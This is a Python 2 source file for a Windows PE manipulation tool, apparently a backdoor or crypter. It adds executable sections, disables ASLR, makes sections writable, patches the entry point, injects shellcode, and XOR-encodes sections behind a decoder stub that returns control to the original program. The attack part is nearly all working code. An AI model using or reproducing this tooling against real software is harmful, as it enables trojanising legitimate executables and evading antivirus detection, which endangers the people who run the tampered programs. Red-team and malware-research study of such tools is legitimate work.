import os
import string
import random
import struct
import sys

import pefile
from pwn import disasm, asm
from f_generic import *

jmp_symbols = ['jns', 'jle', 'jg', 'jp', 'jge', 'js', 'jl', 'jbe', 'jo', 'jne', 'jrcxz', 'je', 'jae', 'jno', 'ja', 'jb', 'jnp', 'jmp']

class pe_x86():
    # Init
    def __init__(self, filename, verbose = False, output_filename = None):
        self.filename = filename
        self.verbose = verbose
        self.output_filename = output_filename
        self.pe = 0
        self.ep_addr = 0
        self.dll_chars = 0
        self.ep_instructions = []
        self.asm_xor_routine = ""

    #####################################################
    # Loader/Writer
    #####################################################

    # Load a PE file, triggers errors if can't find file (or not PE format)
    def load_pe(self):
        if os.path.isfile(self.filename):
            print "\n[*] Loading PE file (\"%s\")" % (self.filename)
            try:
                self.pe = pefile.PE(self.filename)
                self.load_full()
            except pefile.PEFormatError:
                print "[!] File (%s) doesn't seem to be a PE file" % (self.filename)
                sys.exit(1)
        else:
            print "\n[!] File (%s) doesn't exist" % (self.filename)
            sys.exit(1)

    def load_full(self):
        self.ep_addr = self.pe.OPTIONAL_HEADER.AddressOfEntryPoint
        self.dll_chars = self.pe.OPTIONAL_HEADER.DllCharacteristics

    # Return all PE's sections
    def get_sections(self):
        return self.pe.sections

    # Get PE's section flags
    def get_section_flags(self, section_name):
        section, index = find_section(self.get_sections(), section_name)
        return pe_flags_characteristics(section.Characteristics)

    # Write new PE file
    def write_PE_file(self, out_filename):
        if (out_filename == None) or len(out_filename) == 0:
            out_filename = "%s.exe" % ("".join(random.choice(string.ascii_letters) for x in range(10)))
        print "[*] Writing new PE file => \"%s\"" % (out_filename)
        self.pe.write(filename=out_filename)

    #####################################################
    # Analysis
    #####################################################

    # Perform a quick analysis of PE file
    def analyse(self):
        print "\n[*] Analysis"
        # Entry Point
        print " - Entry point: 0x%x" % (self.ep_addr)
        # ASLR
        if (self.dll_chars & 0x40):
            print " - ASLR is enabled"
        else:
            print " - ASLR is disabled"
        # PE TYPE
        if (self.pe.PE_TYPE == 0x10b):
            print " - PE 32-bit!"
        elif (self.pe.PE_TYPE == 0x20b):
            print " - PE 64-bit!"
        else:
            print " - Unknown type!"

    def pe_deeper_analysis(self):
        # Sections
        self.iterate_trough_pe_sections()
        # Requires pwntools
        print "\n - ASM instructions @entry point"
        asm = self.get_ASM_instructions(self.ep_addr, 30)
        for l in asm.split("\n"):
            print "\t%s" % (l)

    # Go through all PE sections (and display them)
    def iterate_trough_pe_sections(self):
        print " - PE sections - %d section(s)" % (self.pe.FILE_HEADER.NumberOfSections)
        print "\t\tVOffset\t\tVSize\t\tSize\t\tName\t\tFlags"
        print "\t\t------------------------------------------------------------"
        for section in self.pe.sections:
            print "\t\t%-10s\t%-10s\t%-10s\t%-10s\t%-5s" % (hex(section.VirtualAddress), hex(section.Misc_VirtualSize), hex(section.SizeOfRawData), section.Name.replace('\x00',''), pe_flags_characteristics(section.Characteristics))

    # Dump opcodes from PE, and display ASM
    def get_ASM_instructions(self, start_address, size = 30, offset = 0):
        blob =  self.pe.get_data(start_address, size)
        return disasm(blob, arch="i386", offset=offset)

    #####################################################
    # Alter PE
    #####################################################

    # Create a new section
    def create_new_section(self, sectionName = ".NewSec", virtualSize = 0x1000, pattern = "\x00", flags = 0xE00000E0, data = ""):
        print "[*] Creating new section (\"%s\")" % (sectionName)
        # File alignment
        alignment = self.pe.OPTIONAL_HEADER.FileAlignment
        # Section alignment
        SectionAlignment = self.pe.OPTIONAL_HEADER.SectionAlignment
        # Get latest section
        latest_section = self.get_sections()[-1]

        # If no data was given
        if len(data) == 0:
            data = virtualSize * pattern
        # Align data
        if (len(data) % alignment) != 0:
            data += "\x00" * (alignment - (len(data) % alignment))

        # Find correct offset (with section alignment)
        if ((latest_section.Misc_VirtualSize % SectionAlignment) != 0):
            virtualAddress = (latest_section.VirtualAddress + latest_section.Misc_VirtualSize - (latest_section.Misc_VirtualSize % SectionAlignment) + SectionAlignment)
        else:
            virtualAddress = (latest_section.VirtualAddress + latest_section.Misc_VirtualSize)

        if (self.verbose):
            print " - Append %d bytes to PE file" % (virtualSize)

        # Add data (of the section header) to the file
        # 0x28 size of section header
        section_table_offset = self.pe.DOS_HEADER.e_lfanew + 4 + self.pe.FILE_HEADER.sizeof() + self.pe.FILE_HEADER.SizeOfOptionalHeader
        nb_sections = self.pe.FILE_HEADER.NumberOfSections

        if (self.pe.OPTIONAL_HEADER.SizeOfHeaders < (section_table_offset + (nb_sections+1) * 0x28)):
            print "[!] Something's wrong with sizeOfHeaders"

        raw_address = latest_section.PointerToRawData + latest_section.SizeOfRawData
        # Append data to file (will always be adding sections at the end of file)
        self.pe.__data__ = self.pe.__data__[:raw_address] + data

        section_offset = section_table_offset + self.pe.FILE_HEADER.NumberOfSections * 0x28

        # Add data of the new section header to PE file
        self.pe.set_bytes_at_offset(section_offset, sectionName)              # Name of new section
        self.pe.set_dword_at_offset(section_offset + 0x08, virtualSize)       # virtualSize
        self.pe.set_dword_at_offset(section_offset + 0x0C, virtualAddress)    # virtualAddress
        self.pe.set_dword_at_offset(section_offset + 0x10, virtualSize)       # RawSize
        self.pe.set_dword_at_offset(section_offset + 0x14, raw_address)       # RawAddress
        self.pe.set_dword_at_offset(section_offset + 0x18, 0x00000000)        # RelocAddress
        self.pe.set_dword_at_offset(section_offset + 0x1C, 0x00000000)        # LineNumbers
        self.pe.set_word_at_offset(section_offset + 0x20, 0x0000)             # RelocationsNumber
        self.pe.set_word_at_offset(section_offset + 0x22, 0x0000)             # LinenumbersNumber
        self.pe.set_dword_at_offset(section_offset + 0x24, flags)             # Flags

        # Add (+1) new section
        self.pe.FILE_HEADER.NumberOfSections +=1

        self.pe.parse_sections(section_table_offset) # Fetch the PE file sections
        self.adjust_optional_header()

        # Return last created section
        return self.get_sections()[-1]

    def adjust_optional_header(self):
        self.pe.OPTIONAL_HEADER.SizeOfImage = self.pe.sections[-1].VirtualAddress + self.pe.sections[-1].Misc_VirtualSize
        self.pe.OPTIONAL_HEADER.SizeOfCode = 0
        self.pe.OPTIONAL_HEADER.SizeOfInitializedData = 0
        self.pe.OPTIONAL_HEADER.SizeOfUninitializedData = 0

        for section in self.pe.sections:
            if section.Characteristics & 0x00000020:
                self.pe.OPTIONAL_HEADER.SizeOfCode += section.SizeOfRawData
            if section.Characteristics & 0x00000040:
                self.pe.OPTIONAL_HEADER.SizeOfInitializedData += section.SizeOfRawData
            if section.Characteristics & 0x00000080:
                self.pe.OPTIONAL_HEADER.SizeOfUninitializedData += section.SizeOfRawData

    # Disable ASLR
    def disable_aslr(self):
        IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE  = 0x40 # flag indicates relocation at run time
        if (self.pe.OPTIONAL_HEADER.DllCharacteristics & IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE):
            self.pe.OPTIONAL_HEADER.DllCharacteristics &= ~IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE
            print "[*] Disabling ASLR"
        else:
            print "[*] ASLR not enabled"

    # Change a given section's flag (Read, Write, eXecute)
    def change_section_flags(self, section_name, characteristics = 0xE00000E0):
        section, index = find_section(self.get_sections(), section_name)
        if not "w" in pe_flags_characteristics(section.Characteristics):
            # Get section offset
            section_table_offset = self.pe.DOS_HEADER.e_lfanew + 4 + self.pe.FILE_HEADER.sizeof() + self.pe.FILE_HEADER.SizeOfOptionalHeader
            section_offset = section_table_offset + (index) * 0x28

            self.pe.set_dword_at_offset(section_offset + 0x24, 0xE00000E0)
            self.pe.parse_sections(section_table_offset)
            # Flags
            print "[*] Updating section flags | \"%s\" => \"%s\"" % (section.Name.replace("\x00",""), hex(characteristics))
        else:
            print "[*] Updating section flags | \"%s\" is already writeable" % (section.Name.replace("\x00",""))

    def update_entry_point(self, jmp_addr, data):
        print "[*] Updating EntryPoint (jmp reltv %s)" % (hex(jmp_addr))
        self.pe.set_bytes_at_rva(self.ep_addr, data)

    # Injection shellcode into "section_name"
    def inject_shellcode(self, shellcode, addr):
        self.pe.set_bytes_at_rva(addr, shellcode)
        print "[*] Injecting shellcode @ \"%s\"" % (hex(addr))

    #####################################################
    # Work
    #####################################################

    def figure_prologue(self):
        print "[*] Trying to figure out prologue (first few legitimate instructions)"
        # Get first few instructions
        prologue_instructions = self.get_ASM_instructions(self.ep_addr, 40)
        if self.verbose:
            display_ASM_instructions(prologue_instructions, self.ep_addr)

        count = 0
        for inst in prologue_instructions.split("\n"):
            splitted_instructions = inst.split("  ")
            opcode = splitted_instructions[0].replace(" ","")               # Op code
            asm_mnemo = "".join(splitted_instructions[1:])                  # asm mnemonic

            # Append instructions
            self.ep_instructions.append((opcode, asm_mnemo))

            count += len(opcode)
            if (count >= 6) or (count != 0) and (count % 5 == 0):
                break

    # Add prologue (few first legit instructions) in order to resume PE's execution flow
    def add_resume_instructions(self, new_section):
        offset_start = 0

        if len(self.ep_instructions) == 0:
            print "[!] Can't figure out prologue, the program might crash at run time"
        else:
            for opcode, mnemo in self.ep_instructions:
                if "call" in mnemo: # Add call instruction
                    legit_offset_call = mnemo.replace("call","").replace(" ","")  # Get offset from EntryPoint
                    offset_2_call = (self.ep_addr - (new_section.VirtualAddress + len(self.asm_xor_routine)) + int(legit_offset_call, 16))
                    self.asm_xor_routine += "\xE8" + p(offset_2_call - 5)
                elif mnemo in jmp_symbols:
                    print "jmp"
                else: # Simply add every other instructions
                    offset_start += (len(opcode)/2)
                    proper_opcode = "\\x" + "\\x".join(opcode[i:i+2] for i in range(0, len(opcode), 2))
                    self.asm_xor_routine += proper_opcode.decode('string-escape')

        # Last jump to get back to entrypoint + offset (already put legit instructions)
        current_addr = (new_section.VirtualAddress + len(self.asm_xor_routine)) # Current addr of new section + size of routine + size of call
        where_2_jmp = (self.ep_addr + ((offset_start - 5) if (offset_start > 0) else 0))
        self.asm_xor_routine += "\xe9" + calc_jmp_offset(current_addr, where_2_jmp)

        # Add \x90 if needed
        if (len(self.asm_xor_routine)) % 4 != 0:
            self.asm_xor_routine += "\x90" * ((len(self.asm_xor_routine)) % 4)

        return self.asm_xor_routine, offset_start

    # XOR a PE's section
    def xor_section(self, section, key=0xA0, offset=5):
        result = ""

        if ".text" in section.Name:
            start_offset = self.ep_addr + offset # Do not override EntryPoint
        else:
            start_offset = section.VirtualAddress

        # Go through all data, from Entry point to end of section
        for d in section.get_data(start_offset):
            result += chr(ord(d)^key)

        # Add XORed data @ VirtualAddress
        self.pe.set_bytes_at_rva(start_offset, result)

    def xor_update_section(self, section):
        # XOR corresponding section
        self.xor_section(section)
        # Find size (and index) of a specific section
        section_text, index_section_text = find_section(self.get_sections(), section_name = ".text")

        diff_end_section = (section.VirtualAddress + section.Misc_VirtualSize) - (self.ep_addr)
        diff_start_section = None
        if (".text" not in section.Name):
            diff_start_section = section.VirtualAddress - (self.ep_addr) - 5

        # Create XOR routine
        self.asm_xor_routine += xor_routine_asm(diff_end_section, diff_start_section)
